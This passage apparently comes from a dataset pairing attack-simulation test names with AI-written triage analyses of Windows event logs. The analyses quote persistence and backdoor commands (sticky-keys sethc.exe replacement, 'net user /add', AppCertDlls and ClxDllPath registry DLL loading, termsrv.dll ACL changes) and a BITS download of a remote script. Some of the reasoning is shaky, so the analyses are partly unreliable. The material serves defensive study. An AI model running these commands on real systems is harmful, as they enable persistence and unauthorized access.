The activities captured in the logs strongly indicate malicious intent, specifically targeting persistence through registry changes and manipulating potential evidence of malicious activities. Immediate actions are required to contain and mitigate the threats."
Create a new user in a command prompt,"Based on the provided Windows event logs, there are a few key activities that stand out and warrant further analysis to determine the nature of the activity:

1. **Privilege Escalation and User Account Creation**: 
   - The event log entries related to EventID 4672 indicate that the `admin_test` user account was granted a set of high-level privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While this can be legitimate for administrative tasks, it is crucial to verify if this account's activities align with expected behavior.
   - The Sysmon logs and Security logs indicate the creation of a user account `data.001_CMD`. This was executed via the command line using `cmd.exe`, evidenced by EventID 1 with the command `""cmd.exe"" /c net user /add ""data.001_CMD"" ""data.001_CMD!""`. The fact that this occurred is suspicious as it often indicates attempts to establish unauthorized backdoor access.

2. **Anomalous Command Execution and Tool Usage**:
   - There are entries showing the execution of several Windows native processes like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. These are often used as part of reconnaissance or attack scripts to gather system information or manipulate system configurations.
   - The repeated execution of these utilities in a short span of time could indicate a script or tool being run, possibly indicating compromise.

3. **Unusual Time Change Events**:
   - There are events indicating changes to the system time (EventID 4616). While not necessarily malicious, altering system time can be done to avoid detection by altering time stamps associated with various actions. Cross-reference whether these time changes align with legitimate administrative tasks or scheduled maintenance.

4. **Network Connection from External IP**:
   - The presence of IP addresses in the Security logs (such as EventID 4624) indicating a successful NTLM logon from the address `fe80::e3b5:5371:12a8:9c77` should be examined. It is an IPv6 link-local address, possibly used to hide external access or exploits.

5. **Microsoft Edge Updates**: 
   - Numerous events related to Microsoft Edge Update processes are seen, including installations and updates (`MicrosoftEdgeUpdate.exe`). Ensure these activities align with legitimate corporate IT update schedules.

### Assessment and Resolution:

Given the above observations, the findings are classified as **SUSPICIOUS** due to:
- Unauthorized user account creation, indicating a potential compromise or the presence of an unauthorized backdoor.
- Enhanced privileges granted to `admin_test` user without clear context.
- Execution of system utilities in a pattern similar to reconnaissance or persistence techniques.

### Guidance on How to Proceed:

- **Immediate Action**: Conduct a thorough investigation of the `admin_test` account. Audit the recent activities of this account and review any policies, scripts, or services that this user may have deployed or altered.
- **Containment**: If suspicious activity is confirmed, disable the `data.001_CMD` account immediately to prevent unauthorized access.
- **Network Traffic Review**: Analyze network logs during the time frame indicated for unusual or unauthorized access attempts, particularly focusing on connections from the IPv6 address seen.
- **Forensic Analysis**: Perform a deeper forensic analysis of the host for indicators of malicious scripts, tools, or malware.
- **Review Update Processes**: Verify that the Microsoft Edge updates are consistent with legitimate update cycles and configurations as per organizational policy.

These steps will aid in determining whether benign administrative actions are misinterpreted or if there is an ongoing security threat requiring remediation."
Replace binary of sticky keys,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **Command Execution with Potential Privilege Escalation:**
   - The process `cmd.exe` is executed with a complex command line:
     ```
     ""cmd.exe"" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\\System32\cmd.exe C:\Windows\System32\sethc.exe
     ```
     This command sequence attempts to back up `sethc.exe`, take ownership of it, modify permissions to grant administrators full access, and replace `sethc.exe` with `cmd.exe`. This is a recognized method to establish a 'sticky keys hack', which allows an unauthorized user to gain a command prompt with elevated privileges.

2. **Process Execution During Update Logs:**
   - While updates to Microsoft Edge are noted (such as MicrosoftEdgeUpdate.exe), their execution appears routine and consistent with legitimate software updates being processed by the system, as logged under application and system logs.

#### Indicators of Malicious Activity

- The execution of the command involving `sethc.exe` replacement is an immediate red flag. This activity typically corresponds to malicious intent, where an attacker attempts to maintain persistent access via unauthorized means.

### Assessment of the Situation

The action involving the `sethc.exe` replacement is highly indicative of malicious behavior, as it appears to be an attempt to exploit the Sticky Keys accessibility feature for unauthorized system access. This particular technique is a well-known method for attackers to maintain elevated privileges.

### Threats or Risks Identified

- **Privilege Escalation and Persistence:** If successful, this would allow an attacker to circumvent the login process and execute system-level commands without proper authentication, posing a significant security threat.

### Guidance on How to Proceed

1. **Immediate Action:**
   - Revert changes to `sethc.exe` by restoring from the backup or an original copy. Ensure file permissions are correctly set to prevent unauthorized use.
   - Investigate the source and context of the command's execution. Determine if it was executed by an authorized administrator or if credentials may have been compromised.
   - Check for any additional signs of unauthorized access or backdoors.

2. **Forensic Analysis:**
   - Conduct a full forensic analysis for indicators of compromise beyond what is available in this log snippet.
   - Audit user accounts and login patterns for anomalies that could indicate compromised credentials.

3. **Preventive Measures:**
   - Strengthen account privileges and access controls, particularly for administrative functions.
   - Deploy enhanced monitoring to detect similar suspicious activities in real-time.

### Resolution

**MALICIOUS** - The activity involving the `sethc.exe` replacement using the command line is confirmed as malicious based on known attack techniques for privilege escalation. Immediate remediation and further investigation are recommended."
Code Executed Via Excel Add-in File (XLL),"After analyzing the provided series of Windows event logs, here is a detailed breakdown and assessment of the potential indicators of malicious activity:

### Anomalous and Suspicious Behaviors
1. **Security Log (Event ID 4798):** This event logs enumeration of local user accounts. The repetitive listing of users such as Administrator, admin_test, and others indicate a potential preparation step by malware or a threat actor to gather information about user accounts on the system. This behavior is suspicious.

2. **Sysmon Log:**
   - **Event ID 5 (Image Load):** There are multiple instances of `wevtutil.exe` initiated by `admin_test`. This executable is typically used for managing event logs but could be exploited by an attacker to clear logs or perform reconnaissance, suggesting suspicious activity.
   - **Event ID 1 (Process Creation):** Several PowerShell executions are logged with complex command lines. One notable PowerShell command loads Excel COM objects and registers XLL files from a TEMP directory, which can be used for malicious purposes, such as executing code (potentially an exploit or payload delivery mechanism).

3. **Windows PowerShell Log:**
   - The logs show PowerShell script execution that leverages Excel COM objects. This is often used in legitimate applications, but in the context of being executed from a TEMP directory with XLL registration, it raises red flags for potential malicious behavior—specifically DLL injection via XLL files.

### Malicious Indicators
- The PowerShell command involves dynamic COM object creation and XLL registration from unusual directories, consistent with behaviors often associated with exploitation frameworks, which is indicative of possible malicious activity.
- The presence of `conhost.exe` in conjunction with PowerShell and `wevtutil.exe` might indicate attempts to obfuscate visibility or tampering with execution processes.

### Assessment
The logs exhibit suspicious activities, combining tools and sequences (e.g., PowerShell commands and user enumeration) often leveraged in targeted attacks or malware deployment processes. Although there's no explicit malware signature identified in the logs, the behavior and context in which these utilities are used suggest potential nefarious intent.

### Resolution
Based on these observations, this activity cannot be deemed purely benign without further investigation into the context and intent, especially focusing on the PowerShell activity and anomalous commands executed under highly privileged user accounts. Therefore, the resolution is:
- **SUSPICIOUS** - Activity does not look right and requires further investigation to determine its nature and intent.

### Guidance on How to Proceed
- **Investigate Process Hierarchy:** Trace the parent processes of suspicious behaviors (especially PowerShell and `wevtutil.exe`) to identify the source and method of execution.
- **Review User Activity:** Specifically focus on `admin_test` activities. Ensure account owners verify those actions.
- **Check Network Traffic:** Analyze for any external communication, especially during or after the execution of anomalous scripts.
- **Threat Intelligence & YARA Rules:** Deploy YARA rules or threat intelligence platforms to correlate these events with known malicious patterns or TTPs (Tactics, Techniques, and Procedures).
- **Endpoint Monitoring:** Ensure appropriate EDR solutions are actively analyzing and alerting on further similar activities, ready to escalate if clear malicious intent is confirmed.
- **Integrity Checks:** Conduct integrity checks on system files and examine any unauthorized file modifications, particularly within system and TEMP directories.

This investigation should assist in determining if the activity is a legitimate operational necessity or a precursor to an active security incident, thus helping mitigate potential risks effectively."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"### Analysis

Upon reviewing the provided log entries, there are multiple indicators of potentially malicious activity rooted in PowerShell usage on the host, along with suspicious registry modifications and scheduled task creations.

#### Key Observations:

1. **Abnormal PowerShell Execution:**
   - The logs document the execution of a PowerShell script that includes detailed command execution regarding the modification of registry settings. Specifically, access to the VBA project model in Word is altered (`AccessVBOM` registry key).
   - The PowerShell script creates VBA macros that can automatically execute tasks when opening Word documents. This is potentially an attempt to establish persistence or automate malicious activities using Office macros.

2. **Registry Changes:**
   - A PowerShell script attempts to modify Word's security setting by changing the `AccessVBOM` value in the registry. This alteration is a known tactic to enable automatic VBA macros, which could be used for executing malicious payloads.

3. **Scheduled Tasks Creation:**
   - A scheduled task was reportedly being created via a macro script that opens the calculator (`calc.exe`) at a specified time. This could act as a decoy or a trojan horse to execute another payload under the guise of a legitimate task. 

4. **Suspicious Use of Microsoft Office Interop Libraries:**
   - The PowerShell script involves loading and using the `Microsoft.Office.Interop.Word` library. Creating a new instance of Word and accessing its VBA project programmatically to add a macro raises a significant red flag. This behavior is unusual in legitimate operations and is common in Office macro-based attacks.

5. **Additional System and Application Logs:**
   - Logs included regular system updates and application updates (like Microsoft Edge) that appear normal and unrelated to the suspicious PowerShell activity.
   - There is a noticeable lack of corresponding entries in Security logs that would typically show audit or access-related information, which could indicate logging misconfigurations or deliberate bypassing.

### Assessment:

Based on the analysis, the activities observed are consistent with tactics used in exploit scenarios involving Office macros for persistence and/or execution of malicious payloads. The attempt to modify security-related registry keys and create automated tasks programmatically suggests a high likelihood of malicious intent.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

- **Immediate Actions:**
  - **Isolate the affected Host:** Disconnect the machine from the network to prevent further spread or command-and-control communications.
  - **Conduct a Comprehensive Forensic Analysis:** Examine the filesystem and memory to gather more information about the script's origin and any additional payloads or exploits.
  - **Check Integrity and Logs:** Validate the integrity of security and system logs and ensure that logging configurations are correctly set.

- **Review and Remediate:**
  - **Review User Privileges:** Examine administrative permissions and user roles, noting any excessive privileges that could be minimized.
  - **Patch Management:** Ensure all software, especially Office applications and scripts executing environments, are fully patched.
  - **Security Awareness Training:** Reinforce guidelines with users about the dangers of macros and downloading documents from unknown sources.

- **Preventive Measures:**
  - **Configure Group Policies:** Disable the execution of macros or restrict it to signed scripts and known trusted sources.
  - **Advanced Monitoring:** Employ deeper monitoring of PowerShell scripts and commands, identifying any anomalies.
  - **Implement EDR Enhancements:** Enable endpoint detection and response (EDR) advanced settings for detecting similar patterns proactively.

The situation involves a sophisticated attempt at potentially compromising the system using well-known persistence and execution techniques. Priority should be given to confirming the scope, purging existing threats, and instituting fortifications against recurrence."
Simulate Patching termsrv.dll,"**Detailed Analysis of the Windows Event Logs:**

After thoroughly analyzing the provided logs, there are clear indications of potentially malicious activity on the system, specifically involving attempts to manipulate the Terminal Services DLL (`termsrv.dll`) through PowerShell commands. Here is a detailed breakdown:

1. **Suspicious PowerShell Activity:**
   
   - There are multiple entries in the PowerShell logs showing a command attempting to modify the `termsrv.dll` file located in `C:\Windows\System32\`. This involves actions like changing file access permissions, creating a backup, and modifying the original DLL file.
   
   - **Example Command Executed:**
     ```
     ""powershell.exe"" & {$termsrvDll = \""C:\Windows\System32\termsrv.dll\"", $ACL = Get-Acl $termsrvDll, $permission = \""Administrators\"",\""FullControl\"",\""Allow\"", $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission, $ACL.SetAccessRule($accessRule), Set-Acl -Path $termsrvDll -AclObject $ACL, Copy-Item -Path \""C:\Windows\System32\termsrv.dll\"" -Destination \""C:\Windows\System32\termsrv_backup.dll\""...
     ```

   - **Assessment:** This is an unusual and suspicious activity as it involves modification of system files that control Windows Remote Desktop, which could be an attempt to bypass licensing restrictions or to insert malicious functionality.

2. **Event ID 4907 in Security Logs:**

   - Indicates the modification of the security descriptor (permissions) of the `termsrv.dll`. This corresponds with the PowerShell activity modifying the DLL file permissions.

3. **Elevated Privileges Detected:**

   - The security logs also show that the user `admin_test` was granted several high-level privileges (`SeDebugPrivilege`, `SeRestorePrivilege`, etc.), and executed the PowerShell script, which aligns with the operations on the `termsrv.dll`.

4. **No Legitimate Context:**

   - The lack of any legitimate context or process hierarchy suggests this might have been conducted with malicious intent. The parent processes leading to the PowerShell command and the manipulation of the DLL are not legitimate administrative tasks in normal operations.

5. **Multiple Consistent Actions:**

   - The repetition of similar commands involving `whoami.exe`, `hostname.exe`, and file permission adjustments throughout the logs point to tools/scripts being executed to gather information and potentially escalate privileges or maintain persistence.

**Conclusion:**
The actions described above, particularly the manipulation of the Terminal Services DLL without any legitimate administrative context or need, are strong indicators of malicious intent. Unauthorized modification of critical system files such as `termsrv.dll` indicates a compromise or at least a significant security breach aimed at altering system behavior.

**Resolution: MALICIOUS**

**Recommendations for Next Steps:**
1. **Immediate Isolation:** Isolate the machine (Server002) from the network to prevent further compromise or data exfiltration.
2. **Forensic Investigation:** Conduct a full forensic analysis of the machine to determine the origin, extent of compromise, and any other affected systems.
3. **System Restore:** Consider restoring the system from a known good backup after remediation to ensure all malicious code is removed.
4. **Update Configurations:** Review and update system configurations, especially focusing on remote access and authentication processes.
5. **Monitoring and Alerting:** Enhance monitoring and set additional alerts for similar activities across the network.

These steps will help contain and remediate the breach while preventing future occurrences."
Install and Register Password Filter DLL,"**Analysis of the Windows Event Logs:**

1. **PowerShell Logs:**
   - Suspicious PowerShell activity is identified where commands were executed to modify the Windows registry related to the Local Security Authority (LSA) configuration. Commands like exporting the LSA configuration and copying a DLL (`filePWFilter.dll`) to `C:\Windows\System32` have been noted. The following actions were performed by the PowerShell script which are highly indicative of malicious activity:
     - The use of `reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\` to export registry settings.
     - The copying of a `.dll` file to the `System32` directory.
     - Modifying `Notification Packages` in the registry, which can often be used to persist malicious password filters.

2. **Sysmon Logs:**
   - Multiple processes related to PowerShell and registry modifications are logged around the same time the suspicious PowerShell script executed. This provides further evidence of malicious activity.
   - The creation of processes such as `powershell.exe`, `reg.exe`, and file operations in the `Local\Temp` folder are consistent with common malware tactics.
   - There is an absence of contextually normal parent processes, making the actions appear deliberate and unauthorized.

3. **No reported system or application errors** in the logs that could relate to these activities, but their absence doesn't make registry and process modifications less suspicious.

4. **Security Logs:**
   - Elevated privileges were detected (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.) indicating potential privilege escalation which is consistent with unauthorized activity.
   - Repeated failed credential access attempts (Event ID 5379) but no conclusive evidence they succeeded.

**Assessment:**
The combination of actions performed—such as unauthorized registry changes, execution of external potentially harmful scripts via PowerShell, privileged access escalation, and suspicious process creations—strongly indicates a breach or malicious activity on the system.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediately isolate the affected system to prevent further spread or damage.
- Analyze the suspicious DLL `filePWFilter.dll` for potential malware.
- Review the modified LSA settings and revert any unauthorized changes.
- Conduct a thorough scan of the system for malware, particularly focusing on persistence mechanisms.
- Identify and revoke any altered privileges granted during the suspected compromise.
- Investigate for any additional indicators of compromise (IoCs) resembling the suspicious behavior across the network to ensure no other systems are affected.
- Notify relevant stakeholders about the incident and document the response process for future improvements and compliance."
Application Shim Installation,"### Detailed Analysis of the Windows Event Logs

#### Overview

The provided Windows event logs, specifically from Sysmon, display a timeline of events linked to process creation, providing insights into potential suspicious activities on the system (Server002). A critical focus is on the processes executed by a particular user with elevated privileges (`SERVER002\\admin_test`), including PowerShell, command prompt executions, and other utilities that could imply attempts at privilege escalation or system manipulation.

#### Observations

1. **PowerShell Execution:**
   - A PowerShell process (`powershell.exe`) was executed by `SERVER002\\admin_test`. PowerShell is a powerful scripting tool and can be used for administrative tasks or potentially malicious activity. No command line arguments were captured, which makes it challenging to assess the intentions of the execution without further details.

2. **Wevtutil and Conhost Activity:**
   - Several invocations of `wevtutil.exe` and corresponding `conhost.exe` instances were observed. `Wevtutil.exe` is typically used to manage event logs and can be leveraged for log clearing or exporting logs, which could indicate attempts to cover tracks.

3. **Tool Usage (whoami, hostname, cmd):**
   - The `whoami.exe` and `hostname.exe` utilities were executed, which indicates potential user reconnaissance activities.
   - A command execution via `cmd.exe` ran `sdbinst.exe` targeting specific files in a temporary directory, which could signify attempts to modify configurations or introduce compatibility shims. This action deserves further exploration as it occurs from a non-standard location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\bin\\`).

4. **EdgeUpdate Processes:**
   - Several instances of EdgeUpdate-related processes (`MicrosoftEdgeUpdate.exe`) are sporadically launched, many times with integrity level `System`. While `EdgeUpdate.exe` is a legitimate updater for Microsoft Edge, its frequent invocation can be scrutinized for possible abuse in malware persistence or downloading further payloads, yet nothing inherently malicious is observed here without clearer signs of abnormality.

5. **Other Observations:**
   - High volume system activity occurring in a short time frame, particularly around event logs management (`wevtutil.exe`) or potential installation/configuration processes, aligns with scripted or automated tasks rather than casual manual processes.

### Threat Assessment

- **Suspicious Activity:** The usage of tools for viewing system and user information (`whoami.exe`, `hostname.exe`) and the suspicious command execution involving `sdbinst.exe` could imply an attempt to change security settings or application settings without obvious reason and intent. Additionally, the repetitive nature of `wevtutil.exe` usage could indicate log tampering.

### Conclusion and Resolution

- **Resolution:** **SUSPICIOUS**
  - The logs exhibit suspicious activity around Event Viewer utility usage, command executions from non-standard locations, and the apparent absence of a clear legitimate need for the executed actions. However, there is insufficient evidence to definitively categorize these actions as malicious without additional contextual information or traces of confirmed intrusion efforts or harmful payloads.
- **Guidance:**
  - Further investigation is required to verify intentions behind these actions, particularly focusing on:
    - Deep inspection of the actions taken by `sdbinst.exe`.
    - Verification of the PowerShell script or commands executed.
    - Checking if similar tasks occur periodically, indicating automation.
    - Reviewing user activity logs around the time of these key events.
    - Conducting a forensic analysis of any suspicious files introduced to the system during this timeline. 

This resolution indicates a need for additional scrutiny while acknowledging the activities seen do not yet definitively indicate compromise but carry potential risks that warrant further exploration."
WMI Invoke-CimMethod Start Process,"Upon analyzing the provided event logs from the Windows host, several observations can be made:

1. **Time Change Events (EventID 4616 and 1):** The logs indicate that the system time was adjusted backward. This is captured in both Security log EventID 4616 and System log EventID 1. Time changes can be suspicious, especially when they occur without significant context, as they might be used to evade timestamp-based detection mechanisms or logs analysis.

2. **Successful Logon with Privileges (EventID 4624 and 4672):** There is a successful logon event (EventID 4624) for the user ""admin_test"" from a workstation with the name ""DESKTOP-3HL5B2P"" utilizing the NTLM authentication package. Following this logon, EventID 4672 indicates that the user obtained high privileges including SeDebugPrivilege, which is commonly used by attackers for privilege escalation and debugging purposes.

3. **Sysmon Process Creation Events (EventID 1 and 5):** The events show several processes executed by the user ""admin_test"". Notably, `powershell.exe` was invoked with a command to execute a PowerShell script that remotely creates a session on ""localhost"" and starts ""calc.exe"". The presence of ""P@ssword1"" in the script indicates a hardcoded password, which is highly insecure and might be an indicator of a compromise.

4. **Remote Process Execution using PowerShell:** The logs show advanced usage of PowerShell to manage sessions and processes remotely. The command in `powershell.exe` creates a CIM session that is leveraged to start ""calc.exe"" using `Invoke-CimMethod` on `Win32_Process`. This script execution could be benign if performed by a legitimate admin task but given the context of non-specific username and typical pentesting behavior, it appears suspicious, especially considering its execution during a logon session with elevated privileges and suspicious remote access.

5. **Additional Utility Executions:** The logs show multiple executions of utilities like `whoami.exe`, `wevtutil.exe`, and `hostname.exe`, which are often used by attackers to gather information about the hosts they have access to and manipulate event logs.

### Assessment:
The logs contain a combination of events that suggest potentially malicious activity, specifically involving high privilege access, unusual time adjustments, and scripting with PowerShell to execute remote commands. While some activities might be benign under certain administrative contexts, the cumulative behavior displayed in these logs, especially the PowerShell script with hardcoded credentials and time adjustments, indicates a more thorough investigation is required.

### Threat and Risk:
There is a potential threat that an attacker might have accessed the user ""admin_test"" account through NTLM and used PowerShell for malicious scripting actions, which included changing the system time and executing several Windows utilities possibly for reconnaissance or log tampering.

### Guidance and Resolution:
Further investigation is warranted, including:
- Reviewing the origin and legitimacy of the NTLM authentication.
- Investigating any unauthorized changes in user accounts or group memberships.
- Analyzing network traffic related to these events for any odd connections or data exfiltration.
- Conducting a detailed review of installed software and running processes for potential changes since these events.

The resolution for this investigation, given the indications of potential malicious activity, is:

**Resolution: SUSPICIOUS - Activity that doesn't look right and needs more investigation.**"
Create registry persistence via AppCert DLL,"### Analysis:

Upon reviewing the provided Windows event logs, I have identified several suspicious activities:

1. **PowerShell Execution:**
   - Multiple instances of `powershell.exe` were logged executing commands that involve copying a DLL to a public directory and then modifying the registry to add this DLL to `AppCertDlls`, which can influence process execution.
   - The command logged in the Sysmon and PowerShell logs: 
     - `""powershell.exe"" & {Copy-Item \""""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\fileTest.dll\\"""" C:\\Users\\Public\\fileTest.dll -Force, reg add \""""HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\\""\"" /v \""""fileTest\""\"" /t REG_EXPAND_SZ /d \""""C:\\Users\\Public\\fileTest.dll\\""\"" /f, if($false){Restart-Computer}}`
   - This behavior is highly indicative of a potential persistence mechanism used by malware to maintain execution of malicious code whenever a certain type of executable is run.

2. **Registry Modification:**
   - The direct modification of `HKEY_LOCAL_MACHINE` hive without proper authorization or legitimate process should raise alerts. Such changes can introduce malicious libraries (DLLs), which can result in code injection or tampering.

3. **Elevated Privileges and High Integrity Level in Hostname and Whoami Executions:**
   - These command-line executions aren't directly malicious but combined with above actions might suggest privilege reconnaissance or access persistence.

4. **User Account Used:**
   - Most actions were performed by the user `SERVER002\admin_test`. This account needs to be further evaluated to confirm whether such actions were part of scheduled legitimate administrative tasks.

### Assessment:

**Situational Assessment:**
- Certain activities such as unauthorized DLL installation in system paths and registry modification without known legitimate software being responsible for it can confirm the suspicion of suspicious or malicious activity on the host system.
- The configuration of `AppCertDlls` is a known technique used by malware for persistence.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance:

Given the identified indicators of compromise and potential malware persistence:

1. **Immediate Actions:**
   - Isolate the affected system to prevent any further spread or damage.
   - Conduct a thorough forensic investigation to confirm the extent of the compromise.
   - Remove the unauthorized registry entries and any suspicious files identified during analysis.
   - Perform a comprehensive malware scan on the isolated system.

2. **System Hardening:**
   - Ensure all systems are up-to-date with the latest security patches.
   - Implement application whitelisting to prevent unauthorized script execution.
   - Limit administrative privileges to only essential personnel.

3. **User Awareness and Training:**
   - Train employees to recognize and report suspicious activities or potential phishing attacks.

By following these steps, the organization can limit potential damage and reinforce its defenses against similar future threats."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"Based on the provided logs, let's analyze the events and determine whether any activities are benign, suspicious, or malicious:

### Analysis:

1. **System Logs:**
   - Time synchronization events are noted with no unusual or suspicious indicators. These events typically occur under normal operating circumstances where the system syncs time with an NTP server (`time.windows.com`).

2. **Security Logs:**
   - A `LogonType` of 5 was noted, indicating a service logon, which is a standard procedure for background service processes.
   - The privileges associated with the `SYSTEM` user account include a comprehensive set of system-level privileges (e.g., `SeDebugPrivilege`). While this might seem alarming, it is typical for the `SYSTEM` account to have such rights.

3. **PowerShell Logs:**
   - Indicate the use of `WMI` (Windows Management Instrumentation) Persistence with `CommandLineEventConsumer`, tied to executing `notepad.exe` as an elevated persistence mechanism.
   - The PowerShell command suggests advanced usage, where a WMI Event Filter, Event Consumer, and FilterToConsumer Binding are created. This type of scripting aligns with advanced threat activity, like persistence mechanisms often associated with malware or advanced persistent threats (APTs).

4. **Application Logs:**
   - Record standard application and update activities, such as Microsoft Edge updates, which appear routine and benign.

5. **Sysmon Logs:**
   - Processes like `hostname.exe`, `conhost.exe`, and `wevtutil.exe` running under a user account (`admin_test`) does not inherently suggest malicious activity. However, `wevtutil.exe` being frequently used can often indicate log clearing attempts.
   - Repeated executions of PowerShell with WMI-related commands and the processes around it align with scripted activity that might be designed for persistence or lateral movement within the network.
   - The use of `Process Creation` and detailed monitoring of processes, especially with Edge Update processes, seems standard but considering the PowerShell events, could be a technique to obscure other malicious activities.

### Conclusion:

The evidence in the logs strongly suggests suspicious activity, particularly in the use of PowerShell and WMI for potential persistence. The WMI setup could be a part of a more sophisticated attack to maintain long-term access. The frequent execution of `wevtutil.exe` could indicate attempts to erase logs, which is suspicious.

Considering these findings, the resolution is:

**SUSPICIOUS** - The activities identified suggest that further investigation, particularly into the PowerShell execution and its related processes, is warranted to determine the intent and any potential security breach. The enterprise security team should prioritize analyzing this activity further, potentially isolating the involved host, and examining it for additional indicators of compromise (IOCs)."
New shim database files created in the default shim database directory,"### Detailed Analysis of the Logs

#### Suspicious Behavior Identification

1. **Unusual PowerShell Activity**:
   - The Windows PowerShell logs show a command execution sequence involving copying a file named `data.011CompatDatabase.sdb` from a temporary directory to system directories `C:\Windows\apppatch\Custom\` and `C:\Windows\apppatch\Custom\Custom64\`. While PowerShell is a legitimate administrative tool, its use to modify or copy files to system directories can be a sign of malicious activity, such as persistence mechanisms or trojan deployment.
   
2. **Process Execution Contexts**:
   - **`whoami.exe`** and **`HOSTNAME.EXE`** executions are normal system calls to check user context and hostname respectively. However, the repeated invocation especially in a sequence could be part of script-driven reconnaissance activity.
   - **`wevtutil.exe`** is used to query or clear event logs. Its invocation here indicates possible intent to manipulate or scrape log files, which might suggest log tampering to cover tracks.

3. **Integrity Level and User Context**:
   - The Sysmon logs show commands executing at a high integrity level under the user `SERVER002\admin_test`. A higher integrity level often suggests administrative privileges were used, heightening the risk of unauthorized system changes.

4. **Edge Update Installer**:
   - A legitimate process conducted by `MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe` related to Microsoft Edge Update is present. However, this process runs under the `NT AUTHORITY\SYSTEM` context. Given that this falls in line with typical update behavior, it seems benign.

5. **Command Line Use**:
   - The PowerShell command line involves obscure paths and filenames (`ADMIN_~1` style) which can create ambiguity about the action. Using short filename convetion to access paths could be used to evade some monitoring strategies that track long names.

6. **File Operations**:
   - The `Copy-Item` PowerShell commands involved in copying an `sdb` file can indicate shadowing of a compatibility database file, a less common but known technique for persistence through DLL side-loading or shims.

#### Assessment and Conclusion

- **Potential Indicators of Compromise (IoC)**:
  - PowerShell activities involving systemic changes are suspicious as they are common steps in various types of malware behaviors.
  - The logging utility (wevtutil.exe) usage and PowerShell's file operations often serve as a reliable indicator of threat actors trying to manipulate system events to avoid detection.
  
- **Resolution**: Based on the detailed review, the logs reveal activities that are **SUSPICIOUS**. They deserve further investigation, particularly focusing on:
  - Verifying the legitimacy of the `sdb` file copied with PowerShell.
  - Checking for any persistence mechanisms set in the system directories.
  - Monitoring for any further administrative tool usage to assess behavioral anomalies.
  
#### Recommended Next Steps

1. **Immediate actions:**
   - Validate the integrity and authenticity of modified or copied files (`data.011CompatDatabase.sdb`).
   - Identify the origin and necessity of the potentially suspicious commands through file hashes and ongoing user behavior.

2. **Further Investigation**:
   - Perform a deeper forensic analysis on the host to identify any potentially altered system configurations or newly introduced persistence mechanisms.
   - Audit system logs and conduct threat intelligence correlation to determine known associated indicators for common malware or legitimate scripts.

3. **Strengthening Security Posture**:
   - Implement robust monitoring for PowerShell and scripting activities using strict logging and behavioral analysis to detect similar future occurrences.
   - Enhance EDR configurations to include alerts for file operations in sensitive directories."
Load custom DLL on mstsc execution,"### Detailed Analysis of the Logs:

Upon review, several aspects of the logs warrant attention due to potential indicators of suspicious or even malicious activity:

1. **System Log Indicators:**
   - **Time Change Events:** There are multiple events indicating changes in system time (Event ID 24 and 1 from `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`). While system time changes can occur legally for various reasons, frequent or unauthorized changes can be suspicious, particularly if performed by a process like `svchost.exe`.

2. **Sysmon Log Indicators:**
   - **Command Execution via cmd.exe:** There is a notable entry in the Sysmon logs showing `cmd.exe` being executed with a command to modify the registry: 
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
     ```
     This action, combined with the registry modification targeting what appears to be the Anti-Malware Scan Interface (AMSI), is highly indicative of malicious behavior, as attackers often modify or disable AMSI to bypass anti-malware protections.

3. **Process Execution and Parent-Child Relationships:**
   - The presence of processes like `conhost.exe`, `whoami.exe`, and repetitive instances of `wevtutil.exe` being spawned or related activities may indicate attempts to gather system information or modify system services/logs. Each of these could be considered suspicious when evaluated in the context of attack chains.

4. **Security Log Indicators:**
   - There are no immediate indicators from the security logs explicitly indicating unauthorized access or privilege escalation (Event ID 4616 pertaining to time change), but the correlation with the system service process (`svchost.exe`) may highlight a potential misuse if verified as unauthorized.

5. **Microsoft Edge Update Activity:**
   - Numerous benign Microsoft Edge Update activities were noted. However, apart from updating mechanisms, no specific malicious activity was detected related to Microsoft Edge Update processes themselves.

### Assessment of the Situation:

- The alteration of the AMSI related registry key through a command line with `cmd.exe` suggests a deliberate attempt to weaken system defenses against malware, which is a strong indicator of malicious intent.

### Resolution:

This analysis concludes with the assessment resolution of **MALICIOUS** due to the critical registry modification indicating tampering with antivirus/anti-malware capabilities. This activity is consistent with tactics employed by malware to evade detection.

### Guidance on How to Proceed:

1. **Immediate Isolation:** The machine should be isolated from the network to prevent further potential damage or data exfiltration.
2. **Deep Forensic Analysis:** Further logs and a complete memory dump should be acquired for comprehensive forensic analysis, focusing on registry changes, process auditing, and network activity.
3. **Containment Actions:** Reverse any unauthorized changes, such as the registry modification of AMSI settings.
4. **Review Policies:** Implement Group Policies to restrict changes to critical system settings such as time adjustments and registry access.
5. **Incident Reporting:** Report the incident according to the organization's policies and comply with any regulatory notifications if required.
6. **User Awareness Training:** Reinforce security awareness and training among users and administrators to recognize and report suspicious activities.

These steps should help ensure that any intrusion is properly contained and analyzed to adjust defenses against future occurrences."
Bitsadmin Download (PowerShell),"Upon careful analysis of the provided log entries, several observations can be made with regard to the indicators of malicious activity:

1. **Unusual PowerShell Execution:**
   - There are multiple PowerShell log entries showing the execution of the command:
     ```powershell
     powershell.exe & {Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/file/file-file/master/files/data/data.md -Destination $env:TEMP\\bitsadmin2_flag.ps1}
     ```
